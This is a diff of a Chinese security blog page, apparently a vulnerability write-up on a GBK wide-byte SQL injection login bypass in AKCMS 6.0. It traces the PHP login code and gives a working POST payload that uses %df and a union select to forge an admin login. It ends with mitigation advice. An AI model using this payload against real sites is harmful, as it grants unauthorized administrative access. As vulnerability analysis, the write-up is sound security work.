@@ -6,19 +6,20 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://showmeshell.top">
-  <title>Archives: 2018/12 | Esther-Cheung And ShowMeShell&#39;s Blog</title>
+  <title>AKCMS 6.0 登录绕过漏洞 | Esther-Cheung And ShowMeShell&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="The Road Of Reverse And Web~">
-<meta name="keywords" content="Security">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Esther-Cheung And ShowMeShell&#39;s Blog">
-<meta property="og:url" content="http://showmeshell.top/archives/2018/12/index.html">
+  <meta name="description" content="漏洞介绍AKCMS 它是一个运行在PHP下的免费CMS，小巧灵活，速度快、兼容性好、能适应各种主机，适合二次开发。 漏洞介绍 由于AKCMS 6.0采用GBK编码，过滤不严谨，导致可以利用宽字节注入而绕过登录。 影响范围 AKCMS 6.0 漏洞危害 攻击者可以通过此漏洞直接获取网站后台权限，威胁网站信息，一旦拿到Webshell，会对服务器的安全造成巨大的威胁。 登录绕过漏洞 由于程序设计过程中">
+<meta name="keywords" content="Web">
+<meta property="og:type" content="article">
+<meta property="og:title" content="AKCMS 6.0 登录绕过漏洞">
+<meta property="og:url" content="http://showmeshell.top/2018/12/03/AKCMS-6-0-登录绕过漏洞/index.html">
 <meta property="og:site_name" content="Esther-Cheung And ShowMeShell&#39;s Blog">
-<meta property="og:description" content="The Road Of Reverse And Web~">
+<meta property="og:description" content="漏洞介绍AKCMS 它是一个运行在PHP下的免费CMS，小巧灵活，速度快、兼容性好、能适应各种主机，适合二次开发。 漏洞介绍 由于AKCMS 6.0采用GBK编码，过滤不严谨，导致可以利用宽字节注入而绕过登录。 影响范围 AKCMS 6.0 漏洞危害 攻击者可以通过此漏洞直接获取网站后台权限，威胁网站信息，一旦拿到Webshell，会对服务器的安全造成巨大的威胁。 登录绕过漏洞 由于程序设计过程中">
 <meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2018-12-03T05:47:10.096Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Esther-Cheung And ShowMeShell&#39;s Blog">
-<meta name="twitter:description" content="The Road Of Reverse And Web~">
+<meta name="twitter:title" content="AKCMS 6.0 登录绕过漏洞">
+<meta name="twitter:description" content="漏洞介绍AKCMS 它是一个运行在PHP下的免费CMS，小巧灵活，速度快、兼容性好、能适应各种主机，适合二次开发。 漏洞介绍 由于AKCMS 6.0采用GBK编码，过滤不严谨，导致可以利用宽字节注入而绕过登录。 影响范围 AKCMS 6.0 漏洞危害 攻击者可以通过此漏洞直接获取网站后台权限，威胁网站信息，一旦拿到Webshell，会对服务器的安全造成巨大的威胁。 登录绕过漏洞 由于程序设计过程中">
   
     <link rel="alternative" href="/atom.xml" title="Esther-Cheung And ShowMeShell&#39;s Blog" type="application/atom+xml">
   
@@ -148,36 +149,112 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
+            <article id="post-AKCMS-6-0-登录绕过漏洞" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
   
+    <h1 class="article-title" itemprop="name">
+      AKCMS 6.0 登录绕过漏洞
+    </h1>
   
-    
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2018" class="archive-year">2018</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/12/03/AKCMS-6-0-登录绕过漏洞/" class="archive-article-date">
+
+        
+        <a href="/2018/12/03/AKCMS-6-0-登录绕过漏洞/" class="archive-article-date">
   	<time datetime="2018-12-03T05:46:14.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-12-03</time>
 </a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/12/03/AKCMS-6-0-登录绕过漏洞/">AKCMS 6.0 登录绕过漏洞</a>
-    </h1>
-  
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p><strong>AKCMS</strong></p>
+<p>它是一个运行在PHP下的免费CMS，小巧灵活，速度快、兼容性好、能适应各种主机，适合二次开发。</p>
+<p><strong>漏洞介绍</strong></p>
+<p>由于AKCMS 6.0采用GBK编码，过滤不严谨，导致可以利用宽字节注入而绕过登录。</p>
+<p><strong>影响范围</strong></p>
+<p>AKCMS 6.0</p>
+<p><strong>漏洞危害</strong></p>
+<p>攻击者可以通过此漏洞直接获取网站后台权限，威胁网站信息，一旦拿到Webshell，会对服务器的安全造成巨大的威胁。</p>
+<p><strong>登录绕过漏洞</strong></p>
+<p>由于程序设计过程中认证逻辑存在缺陷，攻击者可以通过构造的账号和口令或者是访问某个页面、修改Cookie等方式绕过登录认证。</p>
+<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>首先来查看一下这个CMS的登录流程，入口在<code>index.php</code> ：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($get_app)) &#123;</span><br><span class="line"> $app = $get_app;</span><br><span class="line"> <span class="keyword">include</span> AK_ROOT.<span class="string">'include/admin.inc.php'</span>;</span><br><span class="line"> <span class="keyword">include</span> AK_ROOT.<span class="string">'include/app.inc.php'</span>;</span><br><span class="line"> $file = AK_ROOT.<span class="string">'configs/apps/'</span>.$app.<span class="string">'/program/index.php'</span>;</span><br><span class="line"> <span class="keyword">if</span>(file_exists($file)) <span class="keyword">require</span> $file;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"> $file = <span class="string">'install'</span>;</span><br><span class="line"> <span class="keyword">if</span>(ifinstalled()) $file = <span class="string">'admincp'</span>;</span><br><span class="line"> <span class="keyword">if</span>(!<span class="keyword">empty</span>($_GET[<span class="string">'file'</span>])) $file = $_GET[<span class="string">'file'</span>];</span><br><span class="line"> <span class="keyword">if</span>(!in_array($file, <span class="keyword">array</span>(<span class="string">'account'</span>, <span class="string">'admincp'</span>, <span class="string">'db'</span>, <span class="string">'customer'</span>, <span class="string">'install'</span>, <span class="string">'login'</span>, <span class="string">'setting'</span>, <span class="string">'upload'</span>, <span class="string">'welcome'</span>, <span class="string">'upgrade'</span>, <span class="string">'repair'</span>, <span class="string">'theme'</span>, <span class="string">'app'</span>, <span class="string">'license'</span>))) <span class="keyword">exit</span>;</span><br><span class="line"> <span class="keyword">require</span> CORE_ROOT.$file.<span class="string">'.php'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>在最后几行：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!in_array($file, <span class="keyword">array</span>(<span class="string">'account'</span>, <span class="string">'admincp'</span>, <span class="string">'db'</span>, <span class="string">'customer'</span>,  <span class="string">'install'</span>, <span class="string">'login'</span>, <span class="string">'setting'</span>, <span class="string">'upload'</span>, <span class="string">'welcome'</span>, <span class="string">'upgrade'</span>,  <span class="string">'repair'</span>, <span class="string">'theme'</span>, <span class="string">'app'</span>, <span class="string">'license'</span>))) <span class="keyword">exit</span>;</span><br><span class="line"><span class="keyword">require</span> CORE_ROOT.$file.<span class="string">'.php'</span>;</span><br></pre></td></tr></table></figure>
+<p>如果file的值等于login，系统就会调用login.php。</p>
+<p>继续跟进，<code>login.php</code> ：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!defined(<span class="string">'CORE_ROOT'</span>)) <span class="keyword">exit</span>();</span><br><span class="line"><span class="keyword">require_once</span> CORE_ROOT.<span class="string">'include/admin.inc.php'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($post_loginsubmit)) &#123;</span><br><span class="line"> <span class="keyword">if</span>($editor = $db-&gt;get_by(<span class="string">'*'</span>, <span class="string">'admins'</span>, <span class="string">"editor='"</span>.$db-&gt;addslashes($post_username).<span class="string">"'"</span>)) &#123;</span><br><span class="line">  <span class="keyword">if</span>(ak_md5($post_password, <span class="number">0</span>, <span class="number">2</span>) == $editor[<span class="string">'password'</span>]) &#123;</span><br><span class="line">   <span class="keyword">if</span>($editor[<span class="string">'freeze'</span>] == <span class="number">1</span>) adminmsg($lan[<span class="string">'youarefreeze'</span>], <span class="string">'index.php'</span>, <span class="number">3</span>, <span class="number">1</span>);</span><br><span class="line">   <span class="keyword">if</span>(!<span class="keyword">empty</span>($post_rememberlogin)) &#123;</span><br><span class="line">    setlogin($post_username, $thetime + <span class="number">24</span> * <span class="number">3600</span> * <span class="number">365</span> * <span class="number">10</span>);</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    setlogin($post_username);</span><br><span class="line">   &#125;</span><br><span class="line">   $target = <span class="string">'index.php'</span>;</span><br><span class="line">   <span class="keyword">if</span>(ifthemeuninstalled()) $target = <span class="string">'index.php?file=theme&amp;action=themeinstall'</span>;</span><br><span class="line">   adminmsg($lan[<span class="string">'login_success'</span>], $target);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   adminmsg($lan[<span class="string">'login_failed'</span>], <span class="string">'index.php?file=login'</span>, <span class="number">3</span>, <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"> &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  adminmsg($lan[<span class="string">'login_failed'</span>], <span class="string">'index.php?file=login'</span>, <span class="number">3</span>, <span class="number">1</span>);</span><br><span class="line"> &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"> displaytemplate(<span class="string">'login.htm'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>当进入<code>login.php</code>后，首先包含文件<code>admin.inc.php</code>，接下来判断是否设置了<code>post_loginsubmit</code>这个变量，如果设置了则继续判断，没有设置的话，就跳到<code>login.html</code>，提示用户登录。</p>
+<p>一般来说第一次点击<code>login.php</code>，肯定是没有设置之前那个变量的，因此就会提示登录。</p>
+<p>继续看登录之后的判断逻辑。</p>
+<p>将参数传递进去，传递给get_by函数，然后从数据库将对应的字符串取出来，对比两个的哈希值，我们继续跟进get_by函数，位于<code>include/db.class.php</code> ：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_by</span><span class="params">($what, $from, $where = <span class="string">''</span>, $orderby = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">  $table = <span class="keyword">$this</span>-&gt;fulltablename($from);</span><br><span class="line">  $sql = <span class="string">"SELECT &#123;$what&#125; FROM `&#123;$table&#125;`"</span>;</span><br><span class="line">  <span class="keyword">if</span>($where != <span class="string">''</span>) $sql .= <span class="string">" WHERE &#123;$where&#125;"</span>;</span><br><span class="line">  <span class="keyword">if</span>($orderby != <span class="string">''</span>) $sql .= <span class="string">" ORDER BY &#123;$orderby&#125;"</span>;</span><br><span class="line">  <span class="keyword">if</span>(strpos($what, <span class="string">'('</span>) === <span class="keyword">false</span>) $sql .= <span class="string">" LIMIT 1"</span>;</span><br><span class="line">  $row = <span class="keyword">$this</span>-&gt;get_one($sql);</span><br><span class="line">  <span class="keyword">if</span>($row === <span class="keyword">false</span>) &#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">  &#125; <span class="keyword">elseif</span>(count($row) == <span class="number">1</span>) &#123;</span><br><span class="line">   <span class="keyword">return</span> current($row);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="keyword">return</span> $row;</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+<p>在函数 get_by中，我们可以看到，根据传入的参数，拼接sql语句后，传入到get_one中，在传入之前，并没有做任何的过滤，跟进get_one：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_one</span><span class="params">($sql)</span> </span>&#123;</span><br><span class="line">  $arr = <span class="keyword">$this</span>-&gt;querytoarray($sql, <span class="string">''</span>, <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span>(count($arr) &gt; <span class="number">0</span>) <span class="keyword">return</span> array_shift($arr);</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+<p>它调用了querytoarray这个函数，继续跟进这个函数：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">querytoarray</span><span class="params">($sql, $key = <span class="string">''</span>, $num = <span class="number">1000</span>)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">global</span> $sqlcaches;</span><br><span class="line">  $results = <span class="keyword">array</span>();</span><br><span class="line">  <span class="keyword">if</span>(!<span class="keyword">empty</span>($GLOBALS[<span class="string">'batchcreateitemflag'</span>])) &#123;</span><br><span class="line">   <span class="keyword">if</span>(!<span class="keyword">isset</span>($sqlcaches)) $sqlcaches = <span class="keyword">array</span>();</span><br><span class="line">   $cachekey = $sql.<span class="string">'*'</span>.$num;</span><br><span class="line">   <span class="keyword">if</span>(<span class="keyword">isset</span>($sqlcaches[$cachekey])) &#123;</span><br><span class="line">   &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  $query = <span class="keyword">$this</span>-&gt;query($sql);</span><br><span class="line">  $i = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span>($row = <span class="keyword">$this</span>-&gt;fetch_array($query)) &#123;</span><br><span class="line">   <span class="keyword">if</span>($key == <span class="string">''</span> || !<span class="keyword">isset</span>($row[$key])) &#123;</span><br><span class="line">    $results[$i] = $row;</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $results[$row[$key]] = $row;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span>($i ++ &gt;= $num) <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> $results;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到这么一句代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$query = <span class="keyword">$this</span>-&gt;query($sql);</span><br></pre></td></tr></table></figure>
+<p>将sql传入到query中，但这里并没有真正的执行，因此继续跟进query：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">query</span><span class="params">($sql, $ignoresafe = <span class="number">0</span>)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">global</span> $ifdebug, $slowquery, $thetime;</span><br><span class="line">  <span class="keyword">if</span>(!<span class="keyword">empty</span>($ifdebug)) $start = akmicrotime();</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">empty</span>($ignoresafe)) &#123;</span><br><span class="line">   <span class="keyword">if</span>(preg_match(<span class="string">'/^(select|delete)\s+.*?(select|update|detele|insert|replace)\s+/i'</span>, $sql, $match)) &#123;</span><br><span class="line">    eventlog(<span class="string">"REJECT\t"</span>.$sql, <span class="string">'sql'</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">   &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>($ignoresafe == <span class="number">1</span> &amp;&amp; strpos($sql, <span class="string">";\n"</span>) != <span class="keyword">false</span>) &#123;</span><br><span class="line">   $sqls = explode(<span class="string">";\n"</span>, $sql);</span><br><span class="line">   <span class="keyword">foreach</span>($sqls <span class="keyword">as</span> $sql) &#123;</span><br><span class="line">    <span class="keyword">if</span>(trim($sql) != <span class="string">""</span>) $query = <span class="keyword">$this</span>-&gt;_query($sql);</span><br><span class="line">   &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   $query = <span class="keyword">$this</span>-&gt;_query($sql);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<p>首先将sql传入进来，然后经过正则表达式的过滤，在最后调用了_query，这个query就是对sql查询的具体实现。</p>
+<p>通过上述分析，我们可以得出：</p>
+<p><strong>sql在query函数中用了正则表达式做了过滤</strong></p>
+<p><strong>post_username只在login.php中用了addslashes处理。</strong></p>
+<p>只有这两处做了过滤，只要我们绕过了这两处过滤，就可以成功注入。</p>
+<p><strong>如何构造Payload：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^(select|delete)\s+.*?(select|update|detele|insert|replace)\s+/i'</span>, $sql, $match)) &#123;</span><br><span class="line"> eventlog(<span class="string">"REJECT\t"</span>.$sql, <span class="string">'sql'</span>);</span><br><span class="line"> <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>绕过sql在query函数中用正则表达式做过滤，可以用/**/代替空格绕过。</p>
+<p><code>addslashes</code>使用反斜线引用字符串，在单引号，双引号，反斜线，NUL前加反斜线，导致无法闭合。可以利用<strong>GBK宽字符注入</strong>：<strong>在引号前加%df</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> `\xdf\x5c`.decode(<span class="string">'gbk'</span>)     得軍汉字 其中x5c为\</span><br><span class="line">GBK编码，编码范围是<span class="number">0x8140</span>~<span class="number">0xFEFE</span>（不包括xx7F），在遇到%df(ascii(<span class="number">223</span>))&gt;ascii(<span class="number">128</span>)时自动拼接%<span class="number">5</span>c，因此吃掉\，而%<span class="number">27</span>，%<span class="number">20</span>小于ascii(<span class="number">128</span>)的字符就保留了。</span><br></pre></td></tr></table></figure>
+<p>最后分析login的校验为md52次，分析表结构，通过联合union查询，通过分析我们可以得出payload：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action=login&amp;username=a％df' union select/**/1,2,md5(md5(3)),4,5,6#password=3&amp;loginsubmit=％B5％C7％C2％BC</span><br></pre></td></tr></table></figure>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p><a href="http://xx.xx.xx.xx/_aak_cms111/index.php?file=login&amp;crumb=eflAT3" target="_blank" rel="noopener">http://xx.xx.xx.xx/_aak_cms111/index.php?file=login&amp;crumb=eflAT3</a></p>
+<p>利用hackbar，post-payload：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action=login&amp;username=a％df<span class="string">' union select/**/1,2,md5(md5(3)),4,5,6#password=3&amp;loginsubmit=％B5％C7％C2％BC</span></span><br></pre></td></tr></table></figure>
+<h3 id="漏洞防护"><a href="#漏洞防护" class="headerlink" title="漏洞防护"></a>漏洞防护</h3><p>1.代码使用了<code>mysql_query(&quot;set names gbk&quot;)</code>来设置编码，mysql中推荐使用<code>mysql_set_charset(&quot;gbk&quot;)</code>函数来进行编码设置。后者会修改mysql对象中的<code>mysql-&gt;charset</code>属性为设置的字符集。</p>
+<p>2.配套的过滤函数为<code>mysql_real_escape_string()</code></p>
 
-        <div class="article-info info-on-right">
-          
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果~<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/assets/img/zhifubao.jpeg">
+                      <span class="reward-type">支付宝</span>
+                    </div>
+                    
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/assets/img/weixin.jpeg">
+                      <span class="reward-type">微信</span>
+                    </div>
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
@@ -189,95 +266,106 @@
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://showmeshell.top/2018/12/03/AKCMS-6-0-登录绕过漏洞/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/12/02/CmsEasy-5-5-代码执行漏洞/" class="archive-article-date">
-  	<time datetime="2018-12-02T07:08:42.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-12-02</time>
-</a>
+<nav id="article-nav">
+  
+  
+    <a href="/2018/12/02/CmsEasy-5-5-代码执行漏洞/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">CmsEasy 5.5 代码执行漏洞</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
+        
+        
+    </div>
+</aside>
+
+
+
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/12/02/CmsEasy-5-5-代码执行漏洞/">CmsEasy 5.5 代码执行漏洞</a>
-    </h1>
+  
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/12/02/PHPCMS-2008-命令执行漏洞/" class="archive-article-date">
-  	<time datetime="2018-12-02T06:23:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-12-02</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/12/02/PHPCMS-2008-命令执行漏洞/">PHPCMS 2008 命令执行漏洞</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
   
 
-    
+  
 
 
           </div>
@@ -314,8 +402,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
